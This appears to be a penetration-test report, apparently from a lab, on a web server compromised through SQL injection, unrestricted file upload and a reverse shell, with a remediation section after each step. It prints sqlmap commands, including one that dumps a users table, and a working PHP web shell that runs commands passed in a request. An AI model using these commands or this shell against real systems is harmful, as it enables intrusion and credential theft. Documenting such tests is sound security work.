
# Vulnerability Report: Authenticated File Upload + SQL Injection in Web Application + RCE

**Severity**: Critical  
**Tools Used**: rustscan, Nikto, SQLMap, Netcat  
**Suspicious Activity Detection & Threat Actor Behavior Simulation**  
**CVE**: Custom Web Application Vulnerability  
**Impact**: Remote Code Execution (RCE) via Web Shell  
**Affected Host**: Target Linux Web Server  
**Access Level Gained**: Remote shell with same privileges as web server process  

---

## 1. Vulnerability: SQL Injection on Login Page

**Risk Description**:  
A SQL Injection (SQLi) vulnerability was discovered in the `password` parameter of the login form. This allows an attacker to bypass authentication and extract sensitive data from the backend database.

**Exploitation Method**:
- Initial discovery through manual testing and confirmed using SQLMap.  
  ![Screenshot 2025-05-30 230336](https://github.com/user-attachments/assets/2b691c47-a02e-47db-8b2b-e884e2648424)

  ```bash
  sqlmap -u "http://192.168.1.45/admin" --data "username=admin&password=admin123" -p password --risk=3 --level=5 --batch
  ```

  ![Screenshot 2025-05-31 204224](https://github.com/user-attachments/assets/bac3fb25-9db2-4ad0-9045-bcb1d8645600)

  ```bash
  sqlmap -u "http://192.168.1.45/admin" --data "username=admin&password=admin123" -p password -T users --dump --batch
  ```

  ![Screenshot 2025-05-31 204420](https://github.com/user-attachments/assets/cb14eb27-4781-4aaa-9a0d-59b3ee146c54)  
  ![Screenshot 2025-05-31 204548](https://github.com/user-attachments/assets/2d6c0666-069e-48ae-bc5e-49b5fe7839bf)

**Recommendation**:
- Use parameterized queries (prepared statements) to prevent SQL injection.
- Validate all user inputs strictly.
- Implement a Web Application Firewall (WAF).
- Regularly update and patch all components of the web application stack.

---

## 2. Vulnerability: Unrestricted File Upload in Admin Panel

**Risk Description**:  
The admin interface allows uploading of files without proper validation or filtering of file extensions. This permits an attacker to upload and execute a web shell on the server.

**Exploitation Method**:
- Used valid credentials (gathered from SQLi) to log into the admin dashboard.
- Uploaded a PHP-based web shell by bypassing client-side file validation.
- Accessed the shell via its URL path, enabling arbitrary command execution.

**PHP Shell**:  
![image](https://github.com/user-attachments/assets/ce4403a7-781f-41dc-aa93-61df724f5a5c)  
![Screenshot 2025-05-31 211505](https://github.com/user-attachments/assets/d0255c20-dce6-4148-a152-5595500cc4ac)

**Recommendation**:
- Restrict uploads to specific safe file types (e.g., `.jpg`, `.png`).
- Validate file MIME types and extensions server-side.
- Store uploads in non-executable directories.
- Disable execution permission on uploaded files.
- Sanitize filenames and scan for malware signatures.

---

## 3. Vulnerability: Remote Code Execution via Reverse Shell

**Risk Description**:  
Using the uploaded PHP shell, an attacker can execute system commands. This leads to full remote code execution and shell access over the network.

**Exploitation Method**:
- Launched a reverse shell from the web shell to the attacker's listener.
- Netcat was used to establish a reverse connection back to the attacker.

![image](https://github.com/user-attachments/assets/33e5274a-76dc-49dc-b0c4-cb25c0236174)

**Payload**:
```php
<?php
if (isset($_REQUEST["cmd"])) {
    echo "<pre>";
    $cmd = ($_REQUEST["cmd"]);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

![Screenshot 2025-05-31 211904](https://github.com/user-attachments/assets/fda305c9-4c7e-4620-b1ad-d1d50f675444)

**Impact**:
- Shell access with privileges of the web server user.
- Potential for lateral movement and further exploitation.

**Recommendation**:
- Prevent execution of user-uploaded content.
- Harden the web server configuration.
- Use AppArmor/SELinux to restrict what processes can do.
- Implement intrusion detection to monitor for reverse shell activity.
- Conduct regular audits and monitor logs for abnormal behaviors.

---
